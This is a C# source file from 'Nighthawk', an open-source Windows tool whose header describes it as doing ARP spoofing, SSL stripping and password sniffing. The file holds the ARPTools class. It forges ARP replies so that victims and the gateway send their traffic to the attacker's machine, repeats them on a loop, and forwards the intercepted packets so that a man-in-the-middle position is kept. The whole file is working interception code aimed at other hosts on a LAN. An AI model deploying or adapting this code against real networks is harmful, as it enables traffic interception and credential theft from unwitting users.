using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Net;
using System.Threading;
using SharpPcap.WinPcap;
using PacketDotNet;

/**
Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2010  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    /* ARP network scan & ARP spoofing */
    public class ARPTools
    {
        // current device
        private WinPcapDevice device;

        // status
        public bool SpoofingStarted;

        // packet queues (packet store for BG thread to work on)
        public List<ARPPacket> PacketQueue = new List<ARPPacket>();
        private List<ARPPacket> threadQueue = new List<ARPPacket>();

        public List<Packet> PacketQueueRouting = new List<Packet>();
        private List<Packet> threadQueueRouting = new List<Packet>();

        // spoofing data
        public List<Target> SpoofingTargets1;
        public Dictionary<string, PhysicalAddress> IPtoMACTargets1;
        public Target SpoofingTarget2;

        // worker thread
        private Thread workerSender;
        private Thread workerRouter;

        private DeviceInfo deviceInfo;

        // constructor
        public ARPTools(DeviceInfo deviceInfo)
        {
            // store our network interface
            device = deviceInfo.Device;
            this.deviceInfo = deviceInfo;
        }

        // start spoofing
        public void StartSpoofing(List<Target> targets1, Target target2)
        {
            // set targets
            SpoofingTargets1 = targets1;
            SpoofingTarget2 = target2;

            // create a new IP - MAC dictionary
            IPtoMACTargets1 = new Dictionary<string, PhysicalAddress>();
            SpoofingTargets1.ForEach(delegate(Target t) { IPtoMACTargets1.Add(t.IP, t.PMAC); });
            
            // add our own computer to targets - used for routing
            // IPtoMACTargets1.Add(deviceInfo.IP, deviceInfo.PMAC);

            // add a static ARP entry for our gateway
            StaticARP(SpoofingTarget2.IP, SpoofingTarget2.PMAC, deviceInfo.WinName, StaticARPOperation.Add);

            SpoofingStarted = true;

            // clear packet caches
            PacketQueue.Clear();

            // create ARP sender worker
            workerSender = new Thread(new ThreadStart(WorkerSender));
            workerSender.Name = "ARP sender thread";
            workerSender.Start();

            // create ARP router worker
            workerRouter = new Thread(new ThreadStart(WorkerRouter));
            workerRouter.Name = "Router thread";
            workerRouter.Start();
        }

        // stop spoofing
        public void StopSpoofing()
        {
            // remove a static ARP entry for our gateway
            if (SpoofingStarted) StaticARP(SpoofingTarget2.IP, SpoofingTarget2.PMAC, deviceInfo.WinName, StaticARPOperation.Remove);

            SpoofingStarted = false;

            // stop threads & re-ARP
            if (workerSender != null && workerSender.IsAlive)
            {
                ReArpTargets();
                workerSender.Join();
            }

            if (workerRouter != null && workerRouter.IsAlive)
            {
                ReArpTargets();
                workerRouter.Join();
            }

            threadQueue.Clear();
            threadQueueRouting.Clear();
            
            PacketQueue.Clear();
            PacketQueueRouting.Clear();
        }

        // static ARP entry manipulation
        public bool StaticARP(string IP, PhysicalAddress mac, string WinName, StaticARPOperation operation)
        {
            OperatingSystem system = Environment.OSVersion;

            // format MAC
            var macString = Network.FriendlyPhysicalAddress(mac).Replace(":", "-").ToLower();

            // prepare process
            Process p = new Process();

            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            p.StartInfo.FileName = "cmd";

            // Vista, Windows 7 - "netsh"
            if (system.Version.Major > 5)
            {
                // set parameters
                if(operation == StaticARPOperation.Add)
                    p.StartInfo.Arguments = "/k netsh interface ip add neighbors \"" + WinName + "\" " + IP + " " + macString + "";
                else
                    p.StartInfo.Arguments = "/k netsh interface ip delete neighbors \"" + WinName + "\" " + IP + "";

                p.Start();
                p.WaitForExit();

                return true;
            }

            return false;
        }

        // create ARP reply packet - source MAC to device MAC
        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC)
        {
            return GenerateARPReply(senderIP, targetIP, targetMAC, deviceInfo.PMAC);
        }

        // create ARP reply packet
        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC, PhysicalAddress sourceMAC)
        {
            // generate ethernet part - layer 1
            var ethernetPacket = new EthernetPacket(deviceInfo.PMAC, targetMAC,
                                                    EthernetPacketType.Arp);

            // arp data - layer 2
            var arpPacket = new ARPPacket(ARPOperation.Response, targetMAC, IPAddress.Parse(targetIP), sourceMAC,
                                       IPAddress.Parse(senderIP));

            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        // create ARP tracking packet
        private EthernetPacket GenerateARPTracking()
        {
            var targetMAC = PhysicalAddress.Parse("133713371337");

            // generate ethernet part - layer 1
            var ethernetPacket = new EthernetPacket(deviceInfo.PMAC, targetMAC,
                                                    EthernetPacketType.Arp);

            // arp data - layer 2
            var arpPacket = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("FFFFFFFFFFFF"), IPAddress.Parse(deviceInfo.Broadcast), deviceInfo.PMAC,
                                       IPAddress.Parse(deviceInfo.IP));

            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        // send correct ARP entries back to targets
        private void ReArpTargets()
        {
            // use send queue (58 ? bytes per ARP reply)
            var sendQueue = new SendQueue(SpoofingTargets1.Count * 2 * 60);

            foreach (Target target1 in SpoofingTargets1)
            {
                sendQueue.Add(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC, target1.PMAC).Bytes);
                sendQueue.Add(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC, SpoofingTarget2.PMAC).Bytes);
            }

            device.SendQueue(sendQueue, SendQueueTransmitModes.Normal);
            sendQueue.Dispose();

            return;
        }

        // worker function that sends ARP packets
        public void WorkerSender()
        {
            // prepare packets
            var sendQueue = new SendQueue((SpoofingTargets1.Count * 2 * 60) + 60);
            
            foreach (Target target1 in SpoofingTargets1)
            {
                // one way...
                sendQueue.Add(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC).Bytes);

                // ...and another
                sendQueue.Add(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC).Bytes);
            }

            // safety feature (you can be detected even after removal - you're still poisoning with your real MAC address)
            sendQueue.Add(GenerateARPTracking().Bytes);
            // safety feature

            // loop
            while (SpoofingStarted)
            {
                sendQueue.Transmit(device, SendQueueTransmitModes.Normal);

                Thread.Sleep(2500);
            }

            sendQueue.Dispose();

            return;
        }

        // worker function for routing packets
        public void WorkerRouter()
        {
            // loop
            while (SpoofingStarted)
            {
                // size of packets - needed for send queue (set some starting value - it seems the length is not set correctly during threadQueue packet copying)
                int bufferSize = 2048;

                // copy packets to threadRoutingQueue
                lock (PacketQueueRouting)
                {
                    foreach (Packet packet in PacketQueueRouting)
                    {
                        threadQueueRouting.Add(packet);
                        bufferSize += packet.Bytes.Length;
                    }

                    PacketQueueRouting.Clear();
                }

                // check for pending packets
                if (threadQueueRouting.Count > 0)
                {
                    // create send queue
                    var sendQueue = new SendQueue(bufferSize);

                    // loop through packets and re-send them
                    foreach (Packet packet in threadQueueRouting)
                    {
                        if (packet == null) continue;

                        var ethernetPacket = (packet as EthernetPacket);
                        if (ethernetPacket == null) continue;

                        var ip = (packet is IpPacket ? (IpPacket)packet : IpPacket.GetEncapsulated(packet));

                        // get IPs
                        var sourceIP = ip.SourceAddress.ToString();
                        var destinationIP = ip.DestinationAddress.ToString();

                        // get MACs
                        var sourceMAC = ethernetPacket.SourceHwAddress.ToString();
                        var destinationMAC = ethernetPacket.DestinationHwAddress.ToString();

                        // check for checksum 0
                        if (ip is IPv4Packet && ((IPv4Packet)ip).Checksum == 0) continue;

                        // check for matching MAC
                        if (destinationMAC == sourceMAC) continue;
                        
                        // incoming packets
                        if (IPtoMACTargets1.ContainsKey(destinationIP) && (destinationMAC != IPtoMACTargets1[destinationIP].ToString()))
                        {
                            // set real MAC
                            ethernetPacket.SourceHwAddress = deviceInfo.PMAC;
                            ethernetPacket.DestinationHwAddress = IPtoMACTargets1[destinationIP];

                            if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                        }

                        // outgoing packets
                        if (IPtoMACTargets1.ContainsKey(sourceIP) && (destinationMAC != SpoofingTarget2.PMAC.ToString()))
                        {
                            // set real MAC
                            ethernetPacket.SourceHwAddress = deviceInfo.PMAC;
                            ethernetPacket.DestinationHwAddress = SpoofingTarget2.PMAC;

                            if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                        }
                    }

                    // send packets
                    sendQueue.Transmit(device, SendQueueTransmitModes.Normal);
                    sendQueue.Dispose();

                    threadQueueRouting.Clear();
                }
                else
                {
                    Thread.Sleep(10);
                }
            }

            return;
        }
    }

    // static ARP enum
    public enum StaticARPOperation
    {
        Add,
        Remove
    }

}
